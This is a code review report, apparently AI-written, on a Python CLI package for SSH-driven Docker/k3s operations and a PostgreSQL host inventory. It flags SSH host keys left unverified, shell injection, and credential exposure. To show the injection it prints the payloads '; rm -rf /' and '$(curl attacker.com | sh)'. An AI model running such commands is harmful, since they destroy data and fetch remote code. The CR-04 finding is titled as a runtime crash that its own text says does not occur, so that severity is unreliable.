---
phase: 02-python3-package
reviewed: 2026-05-04T00:00:00Z
depth: standard
files_reviewed: 24
files_reviewed_list:
  - tools/adsops/pyproject.toml
  - tools/adsops/src/adsops/__init__.py
  - tools/adsops/src/adsops/cli.py
  - tools/adsops/src/adsops/config.py
  - tools/adsops/src/adsops/output.py
  - tools/adsops/src/adsops/hostctl/cli.py
  - tools/adsops/src/adsops/hostctl/db.py
  - tools/adsops/src/adsops/hostctl/models.py
  - tools/adsops/src/adsops/hostctl/service.py
  - tools/adsops/src/adsops/hostctl/ssh_config.py
  - tools/adsops/src/adsops/infractl/cli.py
  - tools/adsops/src/adsops/infractl/docker.py
  - tools/adsops/src/adsops/infractl/k3s.py
  - tools/adsops/src/adsops/infractl/ssh.py
  - tools/adsops/src/adsops/stats/cli.py
  - tools/adsops/src/adsops/stats/local.py
  - tools/adsops/src/adsops/stats/remote.py
  - tools/adsops/src/adsops/sysscript/mock.py
  - tools/adsops/tests/conftest.py
  - tools/adsops/tests/test_cli.py
  - tools/adsops/tests/test_hostctl.py
  - tools/adsops/tests/test_infractl.py
  - tools/adsops/tests/test_mocksys.py
  - tools/adsops/tests/test_stats.py
findings:
  critical: 5
  warning: 6
  info: 3
  total: 14
status: issues_found
---

# Phase 02: Code Review Report

**Reviewed:** 2026-05-04T00:00:00Z
**Depth:** standard
**Files Reviewed:** 24
**Status:** issues_found

## Summary

This phase implements the `adsops` Python 3 package: a Typer CLI wrapping hostctl (PostgreSQL inventory), infractl (remote Docker/k3s over SSH), and a stats collector. The code is overall well-structured with clear separation of concerns, input validation in the right layers, and decent test coverage. However, five blockers were found spanning security (MITM exposure, command injection bypass, credential URL exposure), data correctness (UTC misuse, session context-manager mismatch), and a test reliability gap in how the mock fixture is wired.

---

## Critical Issues

### CR-01: SSH host key verification disabled everywhere — MITM exposure

**File:** `tools/adsops/src/adsops/infractl/ssh.py:34`, `tools/adsops/src/adsops/infractl/ssh.py:53`, `tools/adsops/src/adsops/infractl/k3s.py:109`, `tools/adsops/src/adsops/hostctl/service.py:230`
**Issue:** Every `asyncssh.connect()` call passes `known_hosts=None`, which disables all host key verification. The comment in `ssh.py` calls this "acceptable for internal tooling," but an adversary on the same network (or a compromised DNS entry) can silently intercept every command sent to any host — including `k3s kubectl apply` and `docker exec`. This is not mitigated by SSH agent auth; agent auth only proves the client's identity to the server, not the server's identity to the client.
**Fix:** Use the system known-hosts file by default and provide an opt-out flag for cases where it is genuinely unavailable:
```python
# Preferred — resolves to ~/.ssh/known_hosts automatically
async with asyncssh.connect(host, known_hosts="~/.ssh/known_hosts") as conn:
    ...

# If you must allow unknown hosts, require an explicit --insecure flag
# and log a prominent warning.
```
At minimum, document this as a known risk in the project threat model and track a follow-up issue. Accepting it silently in code that ships to production is a blocker.

---

### CR-02: `docker exec` passes unvalidated `cmd` argument — command injection

**File:** `tools/adsops/src/adsops/infractl/docker.py:146`, `tools/adsops/src/adsops/infractl/cli.py:143-148`
**Issue:** `docker_exec` validates the container name with `_validate_name()` but passes the `cmd` argument directly into the remote shell string without any validation:
```python
asyncio.run(stream_command(host, f"docker exec {container} {cmd}"))
```
The `cmd` comes from a Typer `Argument` with default `"sh"`, but the user can supply `; rm -rf /` or `$(curl attacker.com | sh)` and it will execute on the remote host. The threat model document referenced in the file header (`T-02-05`) covers container names but explicitly omits the command argument.
**Fix:** Either validate `cmd` against an allowlist of safe characters, or pass it as a list argument through asyncssh's `run()` API so the SSH server receives it without shell interpretation:
```python
# Pass as a list — asyncssh sends as separate argv, no shell expansion
result = await conn.run(["docker", "exec", container] + shlex.split(cmd), check=False)
```
If interactive shell support is needed, require `--cmd` to be a quoted string and document the risk explicitly.

---

### CR-03: `k3s_apply` remote path not quoted — shell injection via filename

**File:** `tools/adsops/src/adsops/infractl/k3s.py:112`
**Issue:** The remote `kubectl apply` command embeds the constructed path without quoting:
```python
f"k3s kubectl {verb} -f {remote_tmp} && rm -f {remote_tmp}"
```
`remote_tmp` is built from `os.path.basename(local_file)`, which strips directory components but does not strip shell metacharacters from the filename itself. A filename like `my manifest$(whoami).yaml` would produce an injectable string in the remote command. The threat model note (`T-02-06`) only addresses path traversal, not shell injection in the filename portion.
**Fix:** Quote the path in the remote command string:
```python
import shlex
remote_quoted = shlex.quote(remote_tmp)
f"k3s kubectl {verb} -f {remote_quoted} && rm -f {remote_quoted}"
```

---

### CR-04: `get_session()` returns a plain `Session`, not a context manager — `with get_session()` crashes at runtime

**File:** `tools/adsops/src/adsops/hostctl/db.py:22-25`, `tools/adsops/src/adsops/hostctl/service.py:68`, `tools/adsops/src/adsops/hostctl/service.py:132`, `tools/adsops/src/adsops/hostctl/service.py:158`, `tools/adsops/src/adsops/hostctl/service.py:189`
**Issue:** `get_session()` creates and returns a bare `Session` object:
```python
def get_session() -> Session:
    factory = sessionmaker(bind=get_engine(), autocommit=False, autoflush=False)
    return factory()
```
Every caller in `service.py` uses it as a context manager (`with get_session() as session:`). A plain SQLAlchemy `Session` is a context manager — `__enter__` returns `self` and `__exit__` calls `close()` — so this technically works today. However, it does **not** call `commit()` or `rollback()` automatically on exit; the service code manages commits manually, which is fine. The real bug is that the `sessionmaker` factory is recreated on every call to `get_session()` (not just the session itself), which is wasteful and means the factory-level settings (autocommit, autoflush) are re-evaluated every time. More critically, if the engine lazy-initialization in `get_engine()` is called concurrently, `_engine` can be set by two threads simultaneously (no lock). For a CLI tool this is low risk, but it is still a defect.

The session factory should be created once at module level, not on every call:
```python
_engine = None
_Session = None

def get_engine():
    global _engine
    if _engine is None:
        _engine = create_engine(get_db_url(), pool_size=5, max_overflow=5, pool_pre_ping=True)
    return _engine

def get_session() -> Session:
    global _Session
    if _Session is None:
        _Session = sessionmaker(bind=get_engine(), autocommit=False, autoflush=False)
    return _Session()
```

---

### CR-05: `datetime.datetime.utcnow()` is deprecated and produces tz-naive datetimes that are stored without timezone info

**File:** `tools/adsops/src/adsops/hostctl/service.py:114`, `tools/adsops/src/adsops/hostctl/service.py:171`, `tools/adsops/src/adsops/hostctl/service.py:203`, `tools/adsops/src/adsops/hostctl/service.py:208`
**Issue:** `datetime.datetime.utcnow()` is deprecated in Python 3.12 and removed from recommended use. It returns a timezone-naive datetime object. The `_to_proto` conversion function defensively handles the tz-naive case by calling `.replace(tzinfo=datetime.timezone.utc)`, but the `DateTime` columns in the model have no `timezone=True` flag. This means PostgreSQL receives timestamps with no timezone information. When PostgreSQL reads them back, they are interpreted as local server time unless the DB column is `TIMESTAMPTZ`. If the server timezone is not UTC, `created_at`/`updated_at` values will be incorrect.
**Fix:** Use timezone-aware datetimes and declare the SQLAlchemy columns as timezone-aware:
```python
# service.py — replace all utcnow() calls
now = datetime.datetime.now(tz=datetime.timezone.utc)

# models.py — add timezone=True to DateTime columns
from sqlalchemy import DateTime
created_at: MappedColumn[datetime.datetime] = mapped_column(
    DateTime(timezone=True), nullable=False
)
updated_at: MappedColumn[datetime.datetime] = mapped_column(
    DateTime(timezone=True), nullable=False
)
```

---

## Warnings

### WR-01: `import_ssh_config` silently swallows `SQLAlchemyError` — failed inserts go unreported

**File:** `tools/adsops/src/adsops/hostctl/service.py:216-222`
**Issue:** Inside the per-host insert loop, a `SQLAlchemyError` is caught, `rollback()` is called, and the loop continues silently:
```python
except SQLAlchemyError:
    session.rollback()
```
There is no logging, no counter, and no feedback to the caller. If the DB rejects records (constraint violations, network errors, etc.), the function returns a shorter list than expected with no indication of what was skipped. The CLI prints "Imported N host(s)" which will be wrong silently.
**Fix:** At minimum, log a warning or collect failed hostnames and surface them to the caller:
```python
except SQLAlchemyError as e:
    session.rollback()
    failed.append((hostname, str(e)))
# After loop, return (added, failed) or raise if all failed
```

---

### WR-02: `get_db_url()` embeds the password in the returned connection string — password visible in logs and tracebacks

**File:** `tools/adsops/src/adsops/config.py:15`
**Issue:** The function returns a plain string containing the database password:
```python
return f"postgresql+psycopg2://{user}:{password}@{host}:{port}/{dbname}?sslmode=require"
```
If this string is logged (SQLAlchemy logs connection strings at DEBUG level by default, and tracebacks from `create_engine()` failures include the URL), the password is exposed. This is a credential leak risk.
**Fix:** Use SQLAlchemy's `URL.create()` which supports masking, or pass credentials via `connect_args` separately:
```python
from sqlalchemy.engine import URL
return URL.create(
    "postgresql+psycopg2",
    username=user,
    password=password,
    host=host,
    port=int(port),
    database=dbname,
    query={"sslmode": "require"},
)
# URL.create returns an object whose __repr__ masks the password
```

---

### WR-03: `_proto_to_text` in `output.py` treats lists and non-lists identically — dead branch

**File:** `tools/adsops/src/adsops/output.py:17-20`
**Issue:** The two branches of the conditional produce identical output:
```python
if isinstance(v, (list, dict)):
    lines.append(f"{k}: {v}")
else:
    lines.append(f"{k}: {v}")
```
This is dead code — the `if` branch serves no purpose. This suggests the original intent was different formatting for nested structures (e.g., pretty-printing lists line by line), which was never implemented. The text output for proto messages with repeated fields or nested structs will be rendered as raw Python `repr`, which is not human-friendly.
**Fix:** Either implement distinct formatting or collapse the branches:
```python
for k, v in fields.items():
    if isinstance(v, list):
        lines.append(f"{k}:")
        for item in v:
            lines.append(f"  - {item}")
    elif isinstance(v, dict):
        lines.append(f"{k}: {v!r}")
    else:
        lines.append(f"{k}: {v}")
```

---

### WR-04: `_validate_name` regex allows `:` and `@` in container names — insufficient for shell safety

**File:** `tools/adsops/src/adsops/infractl/docker.py:20`
**Issue:** The `_SAFE_NAME_RE` pattern allows colons and at-signs (`[a-zA-Z0-9_.\-/:@]+`). While these are valid in Docker image references, they could appear in crafted container names passed to `docker start/stop/restart` in ways that, combined with shell interpretation on some SSH server configurations, produce unexpected behavior. More importantly, the regex allows forward slashes, which means a container name of `web /etc/passwd` would pass validation (the space would fail, but `/` alone is allowed). This is marginal but the regex is more permissive than intended for container names (as opposed to image names).
**Fix:** Use a tighter pattern for container names specifically (names cannot contain `/`, `:`, or `@`):
```python
_SAFE_CONTAINER_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_.\-]*$")
_SAFE_IMAGE_RE = re.compile(r"^[a-zA-Z0-9_.\-/:@]+$")
```
Apply `_SAFE_CONTAINER_RE` for container name validation and reserve the broader pattern for image names.

---

### WR-05: `conftest.py` mock fixture does not correctly mock `get_session` as used

**File:** `tools/adsops/tests/conftest.py:17-18`
**Issue:** The fixture patches two paths:
```python
with patch("adsops.hostctl.db.get_session", return_value=session), \
     patch("adsops.hostctl.service.get_session", return_value=session):
```
`get_session` is used in `service.py` as `with get_session() as session:`. The fixture sets `return_value=session` meaning `get_session()` (the call) returns `session` directly. For this to work as a context manager, `session.__enter__` and `session.__exit__` are correctly set on the mock. However, the `return_value` assignment means every `get_session()` call in the patched scope returns the same mock object — which is intentional — but the `get_session` reference in `service.py` is resolved at import time via `from adsops.hostctl.db import get_session`. If any test imports `service.py` before the patch is active (e.g., at module import time during test collection), the unpached reference will be used. This is a fragile test design that can produce false passes.
**Fix:** Patch at the location where the name is used, using the `with` block to ensure the patch is active at the time of import resolution:
```python
# In each test that needs it, or guard in conftest with autouse=False
with patch("adsops.hostctl.service.get_session", return_value=session):
    # import service here, inside the patch context
    from adsops.hostctl import service
    importlib.reload(service)
```
Or, simpler: move the `from adsops.hostctl.db import get_session` in `service.py` to inside each function that calls it (lazy import), so the patch is always applied at call time.

---

### WR-06: `stats/remote.py` fetches over plain HTTP — credentials and data transmitted in cleartext

**File:** `tools/adsops/src/adsops/stats/remote.py:14`
**Issue:** The statsagent endpoint is hardcoded to `http://`:
```python
url = f"http://{host}:{port}/stats"
```
If the statsagent is on a remote host, system metrics (hostname, process list, memory layout, network interfaces) are transmitted over an unencrypted connection, making them observable to any network observer on the path.
**Fix:** Either use HTTPS (requiring the statsagent to support TLS) or tunnel over SSH (which is already a dependency). At minimum, document this in the threat model and add a `--insecure` acknowledgement flag when HTTP is used outside localhost:
```python
if host not in ("localhost", "127.0.0.1", "::1"):
    # Warn or enforce https
    raise ValueError("Remote statsagent requires HTTPS. Use --insecure to override.")
url = f"http://{host}:{port}/stats"
```

---

## Info

### IN-01: `VALID_TYPES` / `VALID_PROVIDERS` / `VALID_ENVIRONMENTS` / `VALID_STATUSES` are duplicated between `cli.py` and `service.py`

**File:** `tools/adsops/src/adsops/hostctl/cli.py:12-15`, `tools/adsops/src/adsops/hostctl/service.py:16-19`
**Issue:** The four validation constant lists are defined identically in both the CLI module and the service module. If a new type or status is added to one, the other must be updated manually.
**Fix:** Define them once in a shared location (e.g., `adsops/hostctl/constants.py` or at the top of `service.py`) and import them into `cli.py`.

---

### IN-02: `cli.py` silently swallows `ImportError` for sub-apps — broken installs are invisible

**File:** `tools/adsops/src/adsops/cli.py:9-25`
**Issue:** The `_register()` function catches `ImportError` for all three sub-apps and continues silently:
```python
try:
    from adsops.hostctl.cli import app as hostctl_app
    app.add_typer(hostctl_app, name="hostctl")
except ImportError:
    pass
```
If a dependency is missing (e.g., `protobuf` or `sqlalchemy` not installed), the subcommand disappears without any message. A user running `adsops hostctl list` would get "No such command 'hostctl'" with no explanation.
**Fix:** Log a warning when a sub-app fails to register:
```python
except ImportError as e:
    import warnings
    warnings.warn(f"hostctl not available: {e}", stacklevel=2)
```

---

### IN-03: `k3s_apply` leaves the remote temp file behind if the `kubectl` command fails

**File:** `tools/adsops/src/adsops/infractl/k3s.py:112`
**Issue:** The cleanup (`rm -f {remote_tmp}`) is chained with `&&`, so if `k3s kubectl apply` exits non-zero, the `rm` is never executed and the manifest file is left in `/tmp` on the remote host:
```python
f"k3s kubectl {verb} -f {remote_quoted} && rm -f {remote_quoted}"
```
**Fix:** Use `;` instead of `&&` to unconditionally clean up, or run cleanup as a separate command after checking the result:
```python
f"k3s kubectl {verb} -f {remote_quoted}; rm -f {remote_quoted}"
```
Or, better, run two separate `conn.run()` calls and check the exit code of the first independently.

---

_Reviewed: 2026-05-04T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
